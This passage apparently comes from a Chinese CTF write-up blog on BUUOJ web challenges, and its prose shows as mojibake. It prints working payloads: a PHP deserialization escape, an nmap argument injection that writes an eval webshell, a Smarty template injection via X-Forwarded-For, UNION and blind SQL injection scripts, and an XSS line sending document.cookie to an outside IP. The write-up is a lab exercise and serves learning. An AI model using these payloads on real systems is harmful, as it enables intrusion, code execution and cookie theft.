</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($img){
</span></span><span style=display:flex><span>    $filter_arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;php&#39;</span>,<span style=color:#e6db74>&#39;flag&#39;</span>,<span style=color:#e6db74>&#39;php5&#39;</span>,<span style=color:#e6db74>&#39;php4&#39;</span>,<span style=color:#e6db74>&#39;fl1g&#39;</span>);
</span></span><span style=display:flex><span>    $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>,$filter_arr)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/i&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($filter,<span style=color:#e6db74>&#39;&#39;</span>,$img);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SESSION){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unset</span>($_SESSION);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#34;user&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;function&#39;</span>] <span style=color:#f92672>=</span> $function;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>extract</span>($_POST);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$function){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]){
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#e6db74>&#39;guest_img.png&#39;</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>base64_encode</span>($_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$serialize_info <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>serialize</span>($_SESSION));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;highlight_file&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;phpinfo&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;phpinfo();&#39;</span>); <span style=color:#75715e>//maybe you can find something in here!
</span></span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;show_image&#39;</span>){
</span></span><span style=display:flex><span>    $userinfo <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($serialize_info);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>base64_decode</span>($userinfo[<span style=color:#e6db74>&#39;img&#39;</span>]));
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>index.php?f=phpinfo
d0g3_f1ag.php
</code></pre><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /index.php?f<span style=color:#f92672>=</span>show_image HTTP/1.1
</span></span><span style=display:flex><span>Host: 800d1fa3-d4cc-4ba9-b9f0-96759d37ec37.node5.buuoj.cn:81
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>41</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_SESSION<span style=color:#f92672>[</span>a<span style=color:#f92672>]=</span>phpflagflagflagflagflagflagflagflagflagflagflagflagflag&amp;_SESSION<span style=color:#f92672>[</span>img<span style=color:#f92672>]=</span>1&amp;_SESSION<span style=color:#f92672>[</span>exp<span style=color:#f92672>]=</span>;s:3:<span style=color:#e6db74>&#34;img&#34;</span>;s:20:<span style=color:#e6db74>&#34;ZDBnM19mMWFnLnBocA==&#34;</span>;i:0;i:1;<span style=color:#f92672>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /index.php?f<span style=color:#f92672>=</span>show_image HTTP/1.1
</span></span><span style=display:flex><span>Host: 800d1fa3-d4cc-4ba9-b9f0-96759d37ec37.node5.buuoj.cn:81
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>41</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_SESSION<span style=color:#f92672>[</span>a<span style=color:#f92672>]=</span>phpflagflagflagflagflagflagflagflagflagflagflagflagflag&amp;_SESSION<span style=color:#f92672>[</span>img<span style=color:#f92672>]=</span>1&amp;_SESSION<span style=color:#f92672>[</span>exp<span style=color:#f92672>]=</span>;s:3:<span style=color:#e6db74>&#34;img&#34;</span>;s:20:<span style=color:#e6db74>&#34;L2QwZzNfZmxsbGxsbGFn&#34;</span>;i:0;i:1;<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><pre tabindex=0><code>/www.tar.gz
</code></pre><p>æœ‰nä¸ªphpï¼Œç”¨dç›¾æ‰«äº†ä¸€ä¸‹å‘ç°æ¯ä¸ªéƒ½æœ‰å±é™©å‡½æ•°,ç›´æ¥ç½‘ä¸Šæ‰’çš„è„šæœ¬</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;å¼€å§‹æ—¶é—´ï¼š  &#39;</span><span style=color:#f92672>+</span>  time<span style=color:#f92672>.</span>asctime( time<span style=color:#f92672>.</span>localtime(time<span style=color:#f92672>.</span>time()) ))
</span></span><span style=display:flex><span>s1<span style=color:#f92672>=</span>threading<span style=color:#f92672>.</span>Semaphore(<span style=color:#ae81ff>100</span>)  							  			<span style=color:#75715e>#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span>
</span></span><span style=display:flex><span>filePath <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;D:/phpstudy_pro/WWW/src/src&#34;</span>                   <span style=color:#75715e>#è‡ªå·±æ›¿æ¢ä¸ºæ–‡ä»¶æ‰€åœ¨ç›®å½•</span>
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>chdir(filePath)													<span style=color:#75715e>#æ”¹å˜å½“å‰çš„è·¯å¾„</span>
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>adapters<span style=color:#f92672>.</span>DEFAULT_RETRIES <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>								<span style=color:#75715e>#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>listdir(filePath)
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>session<span style=color:#f92672>.</span>keep_alive <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>											 <span style=color:#75715e># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_content</span>(file):
</span></span><span style=display:flex><span>    s1<span style=color:#f92672>.</span>acquire()
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;trying   &#39;</span><span style=color:#f92672>+</span>file<span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;     &#39;</span><span style=color:#f92672>+</span> time<span style=color:#f92672>.</span>asctime( time<span style=color:#f92672>.</span>localtime(time<span style=color:#f92672>.</span>time()) ))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(file,encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>) <span style=color:#66d9ef>as</span> f:							<span style=color:#75715e>#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span>
</span></span><span style=display:flex><span>            gets <span style=color:#f92672>=</span> list(re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#39;\$_GET\[</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>(.*?)</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>\]&#39;</span>, f<span style=color:#f92672>.</span>read()))
</span></span><span style=display:flex><span>            posts <span style=color:#f92672>=</span> list(re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#39;\$_POST\[</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>(.*?)</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>\]&#39;</span>, f<span style=color:#f92672>.</span>read()))
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {}														<span style=color:#75715e>#æ‰€æœ‰çš„$_POST</span>
</span></span><span style=display:flex><span>    params <span style=color:#f92672>=</span> {}														<span style=color:#75715e>#æ‰€æœ‰çš„$_GET</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> m <span style=color:#f92672>in</span> gets:
</span></span><span style=display:flex><span>        params[m] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;echo &#39;xxxxxx&#39;;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> posts:
</span></span><span style=display:flex><span>        data[n] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;echo &#39;xxxxxx&#39;;&#34;</span>
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://localhost:63343/WWW/src/src/&#39;</span><span style=color:#f92672>+</span>file                      <span style=color:#75715e>#è‡ªå·±æ›¿æ¢ä¸ºæœ¬åœ°url</span>
</span></span><span style=display:flex><span>    req <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>data, params<span style=color:#f92672>=</span>params)			<span style=color:#75715e>#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span>
</span></span><span style=display:flex><span>    req<span style=color:#f92672>.</span>close()												<span style=color:#75715e># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
</span></span><span style=display:flex><span>    req<span style=color:#f92672>.</span>encoding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;utf-8&#39;</span>
</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> req<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#75715e>#print(content)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;xxxxxx&#34;</span> <span style=color:#f92672>in</span> content:									<span style=color:#75715e>#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span>
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> gets:
</span></span><span style=display:flex><span>            req <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;?</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>=&#39;</span><span style=color:#f92672>%</span>a<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;echo &#39;xxxxxx&#39;;&#34;</span>)
</span></span><span style=display:flex><span>            content <span style=color:#f92672>=</span> req<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>            req<span style=color:#f92672>.</span>close()												<span style=color:#75715e># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;xxxxxx&#34;</span> <span style=color:#f92672>in</span> content:
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> flag <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> posts:
</span></span><span style=display:flex><span>                req <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>{b:<span style=color:#e6db74>&#34;echo &#39;xxxxxx&#39;;&#34;</span>})
</span></span><span style=display:flex><span>                content <span style=color:#f92672>=</span> req<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>                req<span style=color:#f92672>.</span>close()												<span style=color:#75715e># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;xxxxxx&#34;</span> <span style=color:#f92672>in</span> content:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> flag <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:													<span style=color:#75715e>#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span>
</span></span><span style=display:flex><span>            param <span style=color:#f92672>=</span> a
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            param <span style=color:#f92672>=</span> b
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#39;</span><span style=color:#f92672>+</span>file<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span>param)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;ç»“æŸæ—¶é—´ï¼š  &#39;</span> <span style=color:#f92672>+</span> time<span style=color:#f92672>.</span>asctime(time<span style=color:#f92672>.</span>localtime(time<span style=color:#f92672>.</span>time())))
</span></span><span style=display:flex><span>    s1<span style=color:#f92672>.</span>release()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> files:															<span style=color:#75715e>#åŠ å…¥å¤šçº¿ç¨‹</span>
</span></span><span style=display:flex><span>   t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>get_content, args<span style=color:#f92672>=</span>(i,))
</span></span><span style=display:flex><span>   t<span style=color:#f92672>.</span>start()
</span></span></code></pre></div><pre tabindex=0><code>http://00305f35-0830-4532-bd50-4eb9fa1e3886.node5.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag
</code></pre><h2 id=ç½‘é¼æ¯-2020-æœ±é›€ç»„nmap>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>å‚è€ƒä¸Šé¢çš„onlinetool</p><p>å…ˆè¾“å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>127.0.0.1 | ls
</span></span><span style=display:flex><span>Hostname: 127.0.0.1 <span style=color:#ae81ff>\|</span> ls <span style=color:#f92672>(</span>user<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>å°è¯•</p><pre tabindex=0><code>&#39;&lt;?php echo `cat /flag`;?&gt;-oG test.php &#39;
</code></pre><p>å›æ˜¾hack</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>127.0.0.1 | <span style=color:#e6db74>&#39; &lt;?= @eval($_POST[&#34;hack&#34;]);?&gt; -oG hack.phtml &#39;</span>
</span></span></code></pre></div><p>ç„¶åæ‰§è¡Œå‘½ä»¤å°±å¥½</p><h2 id=npuctf2020readlezphp>[NPUCTF2020]ReadlezPHP</h2><pre tabindex=0><code>&lt;?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this-&gt;a = &#34;Y-m-d h:i:s&#34;;
        $this-&gt;b = &#34;date&#34;;
    }
    public function __destruct(){
        $a = $this-&gt;a;
        $b = $this-&gt;b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET[&#39;source&#39;]))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET[&#34;data&#34;]);


2025-02-18 01:13:26
</code></pre><pre tabindex=0><code>&lt;?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
}

$exp=new HelloPhp();
$exp-&gt;b=&#39;assert&#39;;
$exp-&gt;a=&#39;phpinfo()&#39;;
echo serialize($exp);
</code></pre><h2 id=asis-2019unicorn-shop>[ASIS 2019]Unicorn shop</h2><pre tabindex=0><code>4 ä¸‡
</code></pre><p>é¢˜ç›®çš„è¦æ±‚å…¶å®å°±æ˜¯æ‰¾æ¯”1337å¤§çš„å•å­—ç¬¦ï¼Œå¯ä»¥å»unicodeæŸ¥æ‰¾</p><h2 id=ciscn2019-åä¸œå—èµ›åŒºweb11>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><pre tabindex=0><code>Build With Smarty !
</code></pre><p>åˆ©ç”¨xffè¿›è¡Œæ¨¡æ¿æ³¨å…¥</p><pre tabindex=0><code>X-Forwarded-For:{system(&#39;cat /flag&#39;)}
</code></pre><h2 id=swpu2019web1>[SWPU2019]Web1</h2><p>å…ˆå°è¯•ï¼Œå‘ç°æ²¡ç”¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;<span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;http://47.83.222.208:5566/1.php?x&#39;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>)&lt;/<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://47.83.222.208:5566/1.php?x=&#34;</span><span style=color:#f92672>+</span>document.<span style=color:#a6e22e>cookie</span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>å°è¯•sqlæ³¨å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;/**/union/**/select/**/1,2,3/**/&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</span>
</span></span></code></pre></div><p>è¿™é‡Œè¿‡æ»¤äº†<code>or</code>,<code>information_schema</code></p><p>å¯ä»¥ä½¿ç”¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>mysql.innodb_table_stats <span style=color:#66d9ef>where</span> database_name<span style=color:#f92672>=</span><span style=color:#66d9ef>database</span>()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#34;web1&#34;&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</span>
</span></span></code></pre></div><p>è¿™é‡Œåˆ©ç”¨äº†æ— å­—æ®µåçˆ†å€¼ï¼Œé‡Œé¢çš„å…ˆæŸ¥è¯¢</p><p>æŸ¥è¯¢ä¼šå…ˆè¿”å›ä¸€è¡Œ <code>(1, 2, 3)</code>ï¼Œç„¶åè¿”å› <code>users</code> è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚<code>group_concat(b)</code> å°†ä¼šæŠŠæ‰€æœ‰çš„ <code>b</code> åˆ—æ•°æ®æ‹¼æ¥èµ·æ¥ã€‚</p><h2 id=bsidescf-2019kookie>[BSidesCF 2019]Kookie</h2><pre tabindex=0><code>Cookie:username=admin
</code></pre><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019finalsql>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>å…¶å®wafæˆ‘ä¹Ÿwafæ²¡å‡ºæ¥ï¼Œæ²¡å¤ªæ‡‚å¼‚æˆ–çš„æ³¨å…¥,ä¹Ÿç®—æ˜¯æŠ¥é”™æ³¨å…¥å§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge: [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://75652247-5ff2-4737-9cae-ce01dc7d1c08.node5.buuoj.cn:81/search.php?id=&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    head, tail <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> head <span style=color:#f92672>&lt;</span> tail:
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr(database(),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># geek</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr((select(group_concat(TABLE_NAME))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr((select(group_concat(column_NAME))from(information_schema.columns)where(table_name=&#39;Flaaaaag&#39;)),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#39;&#39;or(ascii(substr((select(group_concat(password))from(F1naI1y)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))&gt;</span><span style=color:#e6db74>{</span>mid<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Click&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
